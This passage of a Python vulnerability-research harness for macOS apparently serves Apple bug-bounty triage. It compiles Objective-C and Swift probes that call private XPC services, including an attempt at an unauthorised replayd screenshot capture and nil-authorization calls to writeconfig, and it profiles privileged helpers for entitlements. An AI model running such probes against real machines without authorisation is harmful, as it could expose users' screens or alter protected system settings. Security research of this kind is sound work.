                    @"requestNumberOfClientsForProtocols": RunRequestProbe(),
                    @"directorySizeAtPath": RunDirectorySizeProbe(),
                };
                NSData *json = [NSJSONSerialization dataWithJSONObject:result options:NSJSONWritingPrettyPrinted error:nil];
                if (json == nil) {
                    return 1;
                }
                fwrite(json.bytes, 1, json.length, stdout);
                fputc('\n', stdout);
            }
            return 0;
        }
        """
    ).strip() + "\n"

    with tempfile.TemporaryDirectory(prefix="writeconfig_probe_") as temp_root:
        root = Path(temp_root)
        source_path = root / "probe.m"
        binary_path = root / "probe"
        write_text(source_path, source)

        compile_proc = run(
            [
                "clang",
                "-x",
                "objective-c",
                "-fobjc-arc",
                "-framework",
                "Foundation",
                "-o",
                str(binary_path),
                str(source_path),
            ],
            check=False,
        )
        compile_output = stringify_command_output(compile_proc)
        if compile_proc.returncode != 0:
            return {
                "status": "compile-failed",
                "compile_output": compile_output,
            }

        exec_proc = run([str(binary_path)], check=False)
        exec_output = stringify_command_output(exec_proc)
        parsed: dict[str, object] | None = None
        if exec_proc.stdout.strip():
            try:
                loaded = json.loads(exec_proc.stdout)
                if isinstance(loaded, dict):
                    parsed = loaded
            except Exception:
                parsed = None

        return {
            "status": "completed" if exec_proc.returncode == 0 else "runtime-failed",
            "compile_output": compile_output,
            "run_output": exec_output,
            "parsed": parsed,
        }


def run_replayd_probe_suite() -> dict[str, object]:
    source = textwrap.dedent(
        r"""
        #import <Foundation/Foundation.h>
        #import <CoreGraphics/CoreGraphics.h>
        #import <dispatch/dispatch.h>

        @interface RPIOSurfaceObject : NSObject <NSSecureCoding>
        @end

        @implementation RPIOSurfaceObject
        + (BOOL)supportsSecureCoding { return YES; }
        - (instancetype)initWithCoder:(NSCoder *)coder {
            self = [super init];
            return self;
        }
        - (void)encodeWithCoder:(NSCoder *)coder {}
        - (NSString *)description { return @"<RPIOSurfaceObject stub>"; }
        @end

        @protocol RPDaemonProtocol
        - (oneway void)getAllActiveStreamsAndPickersWithCompletionHandler:(void (^)(NSError *error, NSArray *streams, NSArray *pickers))reply;
        - (oneway void)fetchDisplay:(unsigned int)displayID withCompletionHandler:(void (^)(NSDictionary *display, NSError *error))reply;
        - (oneway void)fetchWindow:(unsigned int)windowID withCompletionHandler:(void (^)(NSDictionary *window, NSError *error))reply;
        - (oneway void)captureScreenshot:(NSString *)name withRect:(NSDictionary *)rect contentFilter:(NSDictionary *)filter properties:(NSDictionary *)props completionHandler:(void (^)(RPIOSurfaceObject *surfaceA, RPIOSurfaceObject *surfaceB, NSData *metadata, NSError *error))reply;
        @end

        static NSString *FormatObject(id obj) {
            return obj ? [obj description] : @"<nil>";
        }

        static NSSet *AllowedContainerClasses(void) {
            return [NSSet setWithObjects:
                [NSArray class],
                [NSDictionary class],
                [NSString class],
                [NSNumber class],
                [NSData class],
                [NSError class],
                [NSNull class],
                nil
            ];
        }

        static unsigned int PickWindowID(void) {
            CFArrayRef infos = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID);
            if (infos == NULL) {
                return 0;
            }
            NSArray *windows = CFBridgingRelease(infos);
            int selfPID = [[NSProcessInfo processInfo] processIdentifier];
            for (NSDictionary *entry in windows) {
                NSNumber *ownerPID = entry[(id)kCGWindowOwnerPID];
                NSNumber *layer = entry[(id)kCGWindowLayer];
                NSNumber *windowNumber = entry[(id)kCGWindowNumber];
                if (ownerPID == nil || layer == nil || windowNumber == nil) {
                    continue;
                }
                if ([ownerPID intValue] == selfPID) {
                    continue;
                }
                if ([layer intValue] != 0) {
                    continue;
                }
                return [windowNumber unsignedIntValue];
            }
            return 0;
        }

        static NSArray<NSString *> *RunGetAll(void) {
            NSMutableArray<NSString *> *events = [NSMutableArray array];
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(RPDaemonProtocol)];
            NSSet *allowed = AllowedContainerClasses();
            [iface setClasses:[NSSet setWithObject:[NSError class]] forSelector:@selector(getAllActiveStreamsAndPickersWithCompletionHandler:) argumentIndex:0 ofReply:YES];
            [iface setClasses:allowed forSelector:@selector(getAllActiveStreamsAndPickersWithCompletionHandler:) argumentIndex:1 ofReply:YES];
            [iface setClasses:allowed forSelector:@selector(getAllActiveStreamsAndPickersWithCompletionHandler:) argumentIndex:2 ofReply:YES];

            NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.replayd" options:0];
            conn.remoteObjectInterface = iface;
            conn.interruptionHandler = ^{
                [events addObject:@"interrupted"];
                dispatch_semaphore_signal(sem);
            };
            conn.invalidationHandler = ^{
                [events addObject:@"invalidated"];
                dispatch_semaphore_signal(sem);
            };
            [conn resume];
            [events addObject:@"resumed"];

            id<RPDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
                [events addObject:[NSString stringWithFormat:@"proxy_error:%@:%ld:%@", error.domain, (long)error.code, error.localizedDescription]];
                dispatch_semaphore_signal(sem);
            }];

            [proxy getAllActiveStreamsAndPickersWithCompletionHandler:^(NSError *error, NSArray *streams, NSArray *pickers) {
                [events addObject:[NSString stringWithFormat:@"reply:error=%@ streams=%@ pickers=%@", FormatObject(error), FormatObject(streams), FormatObject(pickers)]];
                dispatch_semaphore_signal(sem);
            }];

            long wait = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)));
            [events addObject:[NSString stringWithFormat:@"wait=%s", wait == 0 ? "signal" : "timeout"]];
            [conn invalidate];
            return events;
        }

        static NSArray<NSString *> *RunFetchDisplay(unsigned int displayID) {
            NSMutableArray<NSString *> *events = [NSMutableArray array];
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(RPDaemonProtocol)];
            NSSet *allowed = AllowedContainerClasses();
            [iface setClasses:allowed forSelector:@selector(fetchDisplay:withCompletionHandler:) argumentIndex:0 ofReply:YES];
            [iface setClasses:[NSSet setWithObject:[NSError class]] forSelector:@selector(fetchDisplay:withCompletionHandler:) argumentIndex:1 ofReply:YES];

            NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.replayd" options:0];
            conn.remoteObjectInterface = iface;
            conn.interruptionHandler = ^{
                [events addObject:@"interrupted"];
                dispatch_semaphore_signal(sem);
            };
            conn.invalidationHandler = ^{
                [events addObject:@"invalidated"];
                dispatch_semaphore_signal(sem);
            };
            [conn resume];
            [events addObject:[NSString stringWithFormat:@"displayID=%u", displayID]];
            [events addObject:@"resumed"];

            id<RPDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
                [events addObject:[NSString stringWithFormat:@"proxy_error:%@:%ld:%@", error.domain, (long)error.code, error.localizedDescription]];
                dispatch_semaphore_signal(sem);
            }];

            [proxy fetchDisplay:displayID withCompletionHandler:^(NSDictionary *display, NSError *error) {
                [events addObject:[NSString stringWithFormat:@"reply:error=%@ value=%@", FormatObject(error), FormatObject(display)]];
                dispatch_semaphore_signal(sem);
            }];

            long wait = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)));
            [events addObject:[NSString stringWithFormat:@"wait=%s", wait == 0 ? "signal" : "timeout"]];
            [conn invalidate];
            return events;
        }

        static NSArray<NSString *> *RunFetchWindow(unsigned int windowID) {
            NSMutableArray<NSString *> *events = [NSMutableArray array];
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(RPDaemonProtocol)];
            NSSet *allowed = AllowedContainerClasses();
            [iface setClasses:allowed forSelector:@selector(fetchWindow:withCompletionHandler:) argumentIndex:0 ofReply:YES];
            [iface setClasses:[NSSet setWithObject:[NSError class]] forSelector:@selector(fetchWindow:withCompletionHandler:) argumentIndex:1 ofReply:YES];

            NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.replayd" options:0];
            conn.remoteObjectInterface = iface;
            conn.interruptionHandler = ^{
                [events addObject:@"interrupted"];
                dispatch_semaphore_signal(sem);
            };
            conn.invalidationHandler = ^{
                [events addObject:@"invalidated"];
                dispatch_semaphore_signal(sem);
            };
            [conn resume];
            [events addObject:[NSString stringWithFormat:@"windowID=%u", windowID]];
            [events addObject:@"resumed"];

            id<RPDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
                [events addObject:[NSString stringWithFormat:@"proxy_error:%@:%ld:%@", error.domain, (long)error.code, error.localizedDescription]];
                dispatch_semaphore_signal(sem);
            }];

            [proxy fetchWindow:windowID withCompletionHandler:^(NSDictionary *window, NSError *error) {
                [events addObject:[NSString stringWithFormat:@"reply:error=%@ value=%@", FormatObject(error), FormatObject(window)]];
                dispatch_semaphore_signal(sem);
            }];

            long wait = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)));
            [events addObject:[NSString stringWithFormat:@"wait=%s", wait == 0 ? "signal" : "timeout"]];
            [conn invalidate];
            return events;
        }

        static NSArray<NSString *> *RunCaptureScreenshotProbe(void) {
            NSMutableArray<NSString *> *events = [NSMutableArray array];
            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
            NSXPCInterface *iface = [NSXPCInterface interfaceWithProtocol:@protocol(RPDaemonProtocol)];
            NSSet *surfaceSet = [NSSet setWithObject:[RPIOSurfaceObject class]];
            [iface setClasses:surfaceSet forSelector:@selector(captureScreenshot:withRect:contentFilter:properties:completionHandler:) argumentIndex:0 ofReply:YES];
            [iface setClasses:surfaceSet forSelector:@selector(captureScreenshot:withRect:contentFilter:properties:completionHandler:) argumentIndex:1 ofReply:YES];
            [iface setClasses:[NSSet setWithObject:[NSData class]] forSelector:@selector(captureScreenshot:withRect:contentFilter:properties:completionHandler:) argumentIndex:2 ofReply:YES];
            [iface setClasses:[NSSet setWithObject:[NSError class]] forSelector:@selector(captureScreenshot:withRect:contentFilter:properties:completionHandler:) argumentIndex:3 ofReply:YES];

            NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.replayd" options:0];
            conn.remoteObjectInterface = iface;
            conn.interruptionHandler = ^{
                [events addObject:@"interrupted"];
                dispatch_semaphore_signal(sem);
            };
            conn.invalidationHandler = ^{
                [events addObject:@"invalidated"];
                dispatch_semaphore_signal(sem);
            };
            [conn resume];
            [events addObject:@"resumed"];

            id<RPDaemonProtocol> proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *error) {
                [events addObject:[NSString stringWithFormat:@"proxy_error:%@:%ld:%@", error.domain, (long)error.code, error.localizedDescription]];
                dispatch_semaphore_signal(sem);
            }];

            NSDictionary *empty = @{};
            [proxy captureScreenshot:@"test" withRect:empty contentFilter:empty properties:empty completionHandler:^(RPIOSurfaceObject *surfaceA, RPIOSurfaceObject *surfaceB, NSData *metadata, NSError *error) {
                NSUInteger metadataLength = metadata ? [metadata length] : 0;
                [events addObject:[NSString stringWithFormat:@"reply:surfaceA=%@ surfaceB=%@ metadataLength=%lu error=%@", FormatObject(surfaceA), FormatObject(surfaceB), (unsigned long)metadataLength, FormatObject(error)]];
                dispatch_semaphore_signal(sem);
            }];

            long wait = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)));
            [events addObject:[NSString stringWithFormat:@"wait=%s", wait == 0 ? "signal" : "timeout"]];
            [conn invalidate];
            return events;
        }

        int main(void) {
            @autoreleasepool {
                NSDictionary *result = @{
                    @"pickedWindowID": @(PickWindowID()),
                    @"getAllActiveStreamsAndPickers": RunGetAll(),
                    @"fetchDisplay": RunFetchDisplay((unsigned int)CGMainDisplayID()),
                    @"fetchWindow": RunFetchWindow(PickWindowID()),
                    @"captureScreenshot": RunCaptureScreenshotProbe(),
                };
                NSData *json = [NSJSONSerialization dataWithJSONObject:result options:NSJSONWritingPrettyPrinted error:nil];
                if (json == nil) {
                    return 1;
                }
                fwrite(json.bytes, 1, json.length, stdout);
                fputc('\n', stdout);
            }
            return 0;
        }
        """
    ).strip() + "\n"

    with tempfile.TemporaryDirectory(prefix="replayd_probe_") as temp_root:
        root = Path(temp_root)
        source_path = root / "probe.m"
        binary_path = root / "probe"
        write_text(source_path, source)

        compile_proc = run(
            [
                "clang",
                "-x",
                "objective-c",
                "-fobjc-arc",
                "-framework",
                "Foundation",
                "-framework",
                "CoreGraphics",
                "-o",
                str(binary_path),
                str(source_path),
            ],
            check=False,
        )
        compile_output = stringify_command_output(compile_proc)
        if compile_proc.returncode != 0:
            return {
                "status": "compile-failed",
                "compile_output": compile_output,
            }

        exec_proc = run([str(binary_path)], check=False)
        exec_output = stringify_command_output(exec_proc)
        parsed: dict[str, object] | None = None
        if exec_proc.stdout.strip():
            try:
                loaded = json.loads(exec_proc.stdout)
                if isinstance(loaded, dict):
                    parsed = loaded
            except Exception:
                parsed = None

        capture_log_proc = run(
            [
                "/usr/bin/log",
                "show",
                "--last",
                "30s",
                "--style",
                "compact",
                "--predicate",
                'process == "replayd" AND eventMessage CONTAINS "captureScreenshot"',
            ],
            check=False,
        )

        return {
            "status": "completed" if exec_proc.returncode == 0 else "runtime-failed",
            "compile_output": compile_output,
            "run_output": exec_output,
            "parsed": parsed,
            "capture_log_output": stringify_command_output(capture_log_proc),
        }


def read_authorizationdb_policy(right: str) -> dict[str, object] | None:
    proc = run(["security", "authorizationdb", "read", right], check=False)
    if proc.returncode != 0 or not proc.stdout.strip():
        return None
    try:
        return plistlib.loads(proc.stdout.encode("utf-8", errors="replace"))
    except Exception:
        return None


def stringify_command_output(proc: subprocess.CompletedProcess[str]) -> str:
    pieces = []
    if proc.stdout:
        pieces.append(proc.stdout.strip())
    if proc.stderr:
        pieces.append(proc.stderr.strip())
    return "\n".join(piece for piece in pieces if piece).strip()


def command_authexec_scan(args: argparse.Namespace) -> int:
    outdir = make_output_dir("authexec_scan", args.output_dir)
    roots = [Path(root).expanduser() for root in args.roots]

    matches: list[dict[str, object]] = []
    scanned = 0
    for binary in iter_candidate_app_binaries(roots):
        scanned += 1
        match = binary_mentions_auth_exec(binary)
        if match:
            matches.append(match)

    result = {
        "roots": [str(root) for root in roots],
        "scanned_binaries": scanned,
        "matches": matches,
    }
    write_json(json_result_path(outdir), result)

    lines = [
        f"Artifacts: {outdir}",
        f"Scanned binaries: {scanned}",
        f"Matches: {len(matches)}",
    ]
    for match in matches:
        lines.append(f"- {match['binary']} ({', '.join(match['evidence'])})")
    print_summary("\n".join(lines))
    return 0


def command_security_authtrampoline_profile(args: argparse.Namespace) -> int:
    outdir = make_output_dir("security_authtrampoline_profile", args.output_dir)
    trampoline = Path("/usr/libexec/security_authtrampoline")
    roots = [Path(root).expanduser() for root in args.roots]

    callers: list[dict[str, object]] = []
    scanned = 0
    for binary in iter_candidate_app_binaries(roots):
        scanned += 1
        match = binary_mentions_auth_exec(binary)
        if match:
            match.update(app_metadata_for_binary(binary))
            callers.append(match)

    file_proc = run(["file", str(trampoline)], check=False)
    otool_proc = run(["otool", "-L", str(trampoline)], check=False)
    strings_proc = run(["strings", "-a", str(trampoline)], check=False)
    codesign_proc = run(["codesign", "-dv", "--entitlements", "-", str(trampoline)], check=False)
    ls_proc = run(["ls", "-lO", str(trampoline)], check=False)
    auth_policy = read_authorizationdb_policy("system.privilege.admin") or {}
    sw_vers = collect_sw_vers()

    decision = "do not report"
    why = (
        "The local evidence currently shows a deprecated setuid-root helper surface plus third-party "
        "callers, but no Apple vulnerability in the helper itself. The binary is execute-only to "
        "non-root users, and there is no demonstrated path confusion, environment inheritance bug, "
        "file-descriptor leak, or first-party caller misuse in the current artifact set."
    )
    missing_proof = [
        "A concrete security claim against /usr/libexec/security_authtrampoline itself, not just the deprecated API surface.",
        "A reliable repro showing user-controlled path, arguments, environment, or descriptors crossing into privileged execution unexpectedly.",
        "Evidence that an Apple first-party caller, not only third-party apps, reaches an unsafe tool path or execution boundary.",
    ]
    next_step = (
        "Review a specific caller that still references AuthorizationExecuteWithPrivileges and determine "
        "whether it lets an untrusted actor influence the tool path, arguments, or environment passed "
        "through the trampoline."
    )

    result = {
        "decision": decision,
        "why": why,
        "missing_proof": missing_proof,
        "next_step": next_step,
        "sw_vers": sw_vers,
        "trampoline": {
            "path": str(trampoline),
            "ls_lO": stringify_command_output(ls_proc),
            "file_output": stringify_command_output(file_proc),
            "otool_output": stringify_command_output(otool_proc),
            "strings_output": stringify_command_output(strings_proc),
            "codesign_output": stringify_command_output(codesign_proc),
        },
        "system_privilege_admin_policy": auth_policy,
        "caller_scan": {
            "roots": [str(root) for root in roots],
            "scanned_binaries": scanned,
            "matches": callers,
        },
    }
    write_json(json_result_path(outdir), result)

    report_lines = [
        "# security_authtrampoline Surface Profile",
        "",
        f"Generated: {dt.datetime.now().astimezone().isoformat()}",
        "",
        "## Host",
        "",
        f"- Product: {sw_vers.get('ProductName', 'unknown')}",
        f"- Version: {sw_vers.get('ProductVersion', 'unknown')}",
        f"- Build: {sw_vers.get('BuildVersion', 'unknown')}",
        "",
        "## Binary Surface",
        "",
        f"- Path: `{trampoline}`",
        f"- Permissions: `{result['trampoline']['ls_lO'] or 'unavailable'}`",
        f"- `file` result: `{result['trampoline']['file_output'] or 'unavailable'}`",
        f"- `otool` result: `{result['trampoline']['otool_output'] or 'unavailable'}`",
        f"- `strings` result: `{result['trampoline']['strings_output'] or 'unavailable'}`",
        f"- `codesign` result: `{result['trampoline']['codesign_output'] or 'unavailable'}`",
        "",
        "## Authorization Policy",
        "",
        f"- Right: `system.privilege.admin`",
        f"- Timeout: `{auth_policy.get('timeout', 'unknown')}`",
        f"- Shared: `{auth_policy.get('shared', 'unknown')}`",
        f"- Comment: `{auth_policy.get('comment', 'unknown')}`",
        "",
        "## Local Caller Candidates",
        "",
        f"- Scanned binaries: `{scanned}`",
        f"- Matches: `{len(callers)}`",
    ]

    if callers:
        report_lines.append("")
        for caller in callers:
            label = caller.get("bundle_name") or Path(str(caller["binary"])).name
            version = caller.get("bundle_version") or "unknown"
            bundle_id = caller.get("bundle_id") or "unknown"
            report_lines.append(
                f"- `{label}` `{version}` (`{bundle_id}`): `{caller['binary']}`"
            )
    else:
        report_lines.extend(["", "- No caller candidates found in the requested roots."])

    report_lines.extend(
        [
            "",
            "## Apple Bounty Triage",
            "",
            f"- Decision: `{decision}`",
            f"- Why: {why}",
            "- Missing proof:",
        ]
    )
    for item in missing_proof:
        report_lines.append(f"  - {item}")
    report_lines.extend(
        [
            f"- Minimum next step: {next_step}",
            "",
        ]
    )

    report_path = outdir / "security_authtrampoline_profile.md"
    write_text(report_path, "\n".join(report_lines) + "\n")

    print_summary(
        "\n".join(
            [
                f"Artifacts: {outdir}",
                f"Report: {report_path}",
                f"Caller candidates: {len(callers)}",
                f"Decision: {decision}",
            ]
        )
    )
    return 0


def command_scopedbookmark_profile(args: argparse.Namespace) -> int:
    outdir = make_output_dir("scopedbookmark_profile", args.output_dir)
    target = Path("/System/Library/CoreServices/ScopedBookmarkAgent")
    launchd_plist = Path("/System/Library/LaunchAgents/com.apple.scopedbookmarkagent.xpc.plist")
    previous_artifact = None
    previous_candidates = sorted(GENERATED_ROOT.glob("scopedbookmark_profile_*"))
    fallback_artifact = None
    for candidate in reversed(previous_candidates):
        if candidate == outdir:
            continue
        result_path = candidate / "result.json"
        if result_path.exists():
            if fallback_artifact is None:
                fallback_artifact = candidate
            try:
                candidate_result = read_json(result_path)
            except Exception:
                continue
            candidate_target = (
                candidate_result.get("target", {})
                if isinstance(candidate_result, dict)
                else {}
            )
            if not isinstance(candidate_target, dict):
                candidate_target = {}
            if any(
                candidate_target.get(key) is True
                for key in [
                    "info_leak_confirmed",
                    "cross_app_state_mutation_confirmed",
                    "restored_original_state",
                ]
            ):
                previous_artifact = candidate
                break
    if previous_artifact is None:
        previous_artifact = fallback_artifact
    previous_result: dict[str, object] = {}
    if previous_artifact is not None:
        previous_result_path = previous_artifact / "result.json"
        if previous_result_path.exists():
            previous_loaded = read_json(previous_result_path)
            if isinstance(previous_loaded, dict):
                previous_result = previous_loaded

    file_proc = run(["file", str(target)], check=False)
    ls_proc = run(["ls", "-lO", str(target)], check=False)
    launchctl_proc = run(
        ["launchctl", "print", f"gui/{os.getuid()}/com.apple.scopedbookmarksagent.xpc"],
        check=False,
    )
    plist_proc = run(["plutil", "-p", str(launchd_plist)], check=False)
    codesign_proc = run(["codesign", "-dv", "--entitlements", "-", str(target)], check=False)
    strings_proc = run(
        [
            "/bin/sh",
            "-lc",
            (
                "strings -a "
                f"{shlex.quote(str(target))} "
                "| rg -n "
                "\"com.apple.private.coreservices.resolve-revocable-bookmarks|"
                "peer_event_handler|handle_revocable|"
                "NSURLRevocableBookmark|"
                "type|crea|reso|rcpy|rids|rset|rrev|add-scope|"
                "Security-scoped bookmark|scope\""
            ),
        ],
        check=False,
    )
    bundle_target = args.bundle_id or "com.shapr3d.shapr"
    mdfind_proc = run(
        ["mdfind", f'kMDItemCFBundleIdentifier == "{bundle_target}"'],
        check=False,
    )
    sw_vers = collect_sw_vers()

    codesign_output = stringify_command_output(codesign_proc)
    strings_output = stringify_command_output(strings_proc)
    previous_target = previous_result.get("target", {})
    if not isinstance(previous_target, dict):
        previous_target = {}

    raw_xpc_strings_present = all(
        marker in strings_output for marker in ["rcpy", "rids", "rset", "rrev", "handle_revocable"]
    )
    full_disk_style_tcc_present = "kTCCServiceSystemPolicyAllFiles" in codesign_output

    decision = "keep researching"
    why = (
        "ScopedBookmarkAgent remains a strong local Apple privacy and integrity lead. "
        "This passive profile confirms that the service is a live per-user LaunchAgent, "
        "its entitlements still include kTCCServiceSystemPolicyAllFiles, and the binary still "
        "advertises revocable-bookmark and raw XPC message-handling strings. "
        "The current command does not send active requests, but it preserves earlier locally observed "
        "cross-app findings for triage and newer-system validation."
    )
    missing_proof = [
        "A fresh current-session reproduction bundle with exact timestamps and sysdiagnose.",
        "Validation on the latest public macOS release.",
        "A tighter impact statement showing whether the cross-app state exposure can be extended into unauthorized file access.",
    ]
    next_step = (
        "Use this passive artifact as the baseline, then rerun the same previously observed before/after/restore "
        "validation on a newer macOS system and compare the results."
    )

    result = {
        "decision": decision,
        "why": why,
        "missing_proof": missing_proof,
        "next_step": next_step,
        "sw_vers": sw_vers,
        "target": {
            "path": str(target),
            "mach_service": "com.apple.scopedbookmarksagent.xpc",
            "launchd_plist": str(launchd_plist),
            "ls_lO": stringify_command_output(ls_proc),
            "file_output": stringify_command_output(file_proc),
            "launchctl_output": stringify_command_output(launchctl_proc),
            "plist_output": stringify_command_output(plist_proc),
            "codesign_output": codesign_output,
            "strings_output": strings_output,
            "raw_xpc_strings_present": raw_xpc_strings_present,
            "full_disk_style_tcc_present": full_disk_style_tcc_present,
            "bundle_id_target": bundle_target,
            "bundle_path_matches": [line for line in mdfind_proc.stdout.splitlines() if line.strip()],
            "prior_observation_artifact": str(previous_artifact) if previous_artifact else None,
            "prior_info_leak_confirmed": previous_target.get("info_leak_confirmed"),
            "prior_cross_app_state_mutation_confirmed": previous_target.get("cross_app_state_mutation_confirmed"),
            "prior_restored_original_state": previous_target.get("restored_original_state"),
            "prior_latest_public_build_mismatch": previous_target.get("latest_public_build_mismatch"),
        },
    }
    write_json(json_result_path(outdir), result)

    report_lines = [
        "# ScopedBookmarkAgent Passive Profile",
        "",
        f"Generated: {dt.datetime.now().astimezone().isoformat()}",
        "",
        "## Host",
        "",
        f"- Product: {sw_vers.get('ProductName', 'unknown')}",
        f"- Version: {sw_vers.get('ProductVersion', 'unknown')}",
        f"- Build: {sw_vers.get('BuildVersion', 'unknown')}",
        "",
        "## Surface",
        "",
        f"- Path: `{target}`",
        f"- Mach service: `com.apple.scopedbookmarksagent.xpc`",
        f"- Launchd plist: `{launchd_plist}`",
        f"- `file` result: `{result['target']['file_output'] or 'unavailable'}`",
        f"- Permissions: `{result['target']['ls_lO'] or 'unavailable'}`",
        f"- Launchd record available: `{bool(result['target']['launchctl_output'])}`",
        f"- Full-disk-style TCC entitlement present: `{full_disk_style_tcc_present}`",
        f"- Revocable/raw-XPC handler strings present: `{raw_xpc_strings_present}`",
        "",
        "## Target App Context",
        "",
        f"- Bundle identifier searched: `{bundle_target}`",
        f"- Bundle path matches: `{result['target']['bundle_path_matches'] or 'none found'}`",
        "",
        "## Prior Local Observation",
        "",
        f"- Previous artifact referenced: `{result['target']['prior_observation_artifact'] or 'none'}`",
        f"- Prior cross-app metadata leak confirmed: `{result['target']['prior_info_leak_confirmed']}`",
        f"- Prior cross-app state mutation confirmed: `{result['target']['prior_cross_app_state_mutation_confirmed']}`",
        f"- Prior state restoration confirmed: `{result['target']['prior_restored_original_state']}`",
        "",
        "## Apple Bounty Triage",
        "",
        f"- Decision: `{decision}`",
        f"- Why: {why}",
        "- Missing proof:",
    ]
    for item in missing_proof:
        report_lines.append(f"  - {item}")
    report_lines.extend(
        [
            f"- Minimum next step: {next_step}",
            "",
            "## Notes",
            "",
            "- This command is intentionally passive and does not send new XPC messages.",
            "- It is meant to preserve a clean baseline for comparison across systems and versions.",
            "",
        ]
    )

    report_path = outdir / "scopedbookmark_profile.md"
    write_text(report_path, "\n".join(report_lines) + "\n")
    print_summary(
        "\n".join(
            [
                f"Artifacts: {outdir}",
                f"Report: {report_path}",
                f"Decision: {decision}",
            ]
        )
    )
    return 0


def command_writeconfig_profile(args: argparse.Namespace) -> int:
    outdir = make_output_dir("writeconfig_profile", args.output_dir)
    target = Path(
        "/System/Library/PrivateFrameworks/SystemAdministration.framework/XPCServices/writeconfig.xpc/Contents/MacOS/writeconfig"
    )
    info_path = target.parent.parent / "Info.plist"

    info_plist: dict[str, object] = {}
    if info_path.exists():
        try:
            info_plist = plistlib.loads(info_path.read_bytes())
        except Exception:
            info_plist = {}

    file_proc = run(["file", str(target)], check=False)
    ls_proc = run(["ls", "-lO", str(target)], check=False)
    info_proc = run(["plutil", "-p", str(info_path)], check=False)
    launchctl_proc = run(
        ["launchctl", "print", "system/com.apple.systemadministration.writeconfig"],
        check=False,
    )
    codesign_proc = run(["codesign", "-dv", "--entitlements", "-", str(target)], check=False)
    strings_proc = run(
        [
            "/bin/sh",
            "-lc",
            (
                "strings "
                f"{shlex.quote(str(target))} "
                "| rg -n "
                "\"Access denied|entitled|audit token|authorization|Authorization|"
                "client path|bundle id|Create authorization|"
                "initWithNoAuthorization|verifyAuthorization|permitsRightString|"
                "requiresAuthorization|NSXPC|listener:shouldAcceptNewConnection|"
                "XPCWriteConfigProtocol\""
            ),
        ],
        check=False,
    )
    connection_probe_proc = run(
        [
            "/bin/sh",
            "-lc",
            textwrap.dedent(
                """
                swift - <<'SWIFT'
                import Foundation

                @objc protocol ProbeProtocol {}

                final class Box: NSObject {
                    let sem = DispatchSemaphore(value: 0)
                    var events: [String] = []
                }

                let service = "com.apple.systemadministration.writeconfig"
                let box = Box()
                let conn = NSXPCConnection(machServiceName: service, options: [])
                conn.remoteObjectInterface = NSXPCInterface(with: ProbeProtocol.self)
                conn.interruptionHandler = {
                    box.events.append("interrupted")
                    box.sem.signal()
                }
                conn.invalidationHandler = {
                    box.events.append("invalidated")
                    box.sem.signal()
                }
                conn.resume()
                box.events.append("resumed")
                _ = conn.remoteObjectProxyWithErrorHandler { error in
                    let ns = error as NSError
                    box.events.append("proxy_error: \\(ns.domain) code=\\(ns.code) \\(ns.localizedDescription)")
                    box.sem.signal()
                }
                let result = box.sem.wait(timeout: .now() + 2.0)
                print("service=\\(service)")
                print("wait_result=\\(result == .success ? "signal" : "timeout")")
                print("events=\\(box.events)")
                conn.invalidate()
                SWIFT
                """
            ),
        ],
        check=False,
    )
    sw_vers = collect_sw_vers()

    strings_output = stringify_command_output(strings_proc)
    codesign_output = stringify_command_output(codesign_proc)
    launchctl_output = stringify_command_output(launchctl_proc)
    connection_probe_output = stringify_command_output(connection_probe_proc)
    selector_summary = classify_writeconfig_selectors(extract_selector_candidates(strings_output))
    readonly_method_probe = run_writeconfig_readonly_probe()

    explicit_client_validation = any(
        marker in strings_output
        for marker in [
            "Client path",
            "bundle id",
            "unentitled client",
            "unknown process pid",
            "listener:shouldAcceptNewConnection:",
        ]
    )
    noauth_initializer_present = "initWithNoAuthorization" in strings_output
    tcc_modify_present = "com.apple.private.tcc.manager.access.modify" in codesign_output
    immediate_reject_observed = "wait_result=signal" in connection_probe_output
    readonly_probe_parsed = readonly_method_probe.get("parsed")
    readonly_probe_interrupted = False
    if isinstance(readonly_probe_parsed, dict):
        readonly_probe_interrupted = any(
            any("interrupted" in str(event) or "proxy_error" in str(event) for event in events)
            for events in readonly_probe_parsed.values()
            if isinstance(events, list)
        )

    decision = "keep researching"
    why = (
        "writeconfig.xpc is an Apple-owned system XPC helper with unusually powerful system-management "
        "and TCC-related entitlements in standard configuration. The binary advertises explicit client-path, "
        "bundle-id, and authorization validation logic, which makes it a strong no-password audit target. "
        "A connection-only probe did not get immediately invalidated, and a read-only selector probe with "
        "authorization set to nil currently causes interruption/proxy-error behavior rather than a clean, "
        "structured authorization denial. That is still ambiguous, but it keeps the service on the short list."
    )
    missing_proof = [
        "A minimal client connection from an unentitled process showing whether the service accepts or rejects the caller.",
        "A selector-level reproduction proving a method that changes protected state can be reached without valid authorization.",
        "Before-versus-after evidence of a real security boundary crossing such as TCC modification, keychain mutation, or privileged file/system configuration change.",
    ]
    next_step = (
        "Build a minimal NSXPC client that targets the writeconfig service identifier and record "
        "which connection attempts or selectors are rejected before authorization is even considered."
    )

    result = {
        "decision": decision,
        "why": why,
        "missing_proof": missing_proof,
        "next_step": next_step,
        "sw_vers": sw_vers,
        "target": {
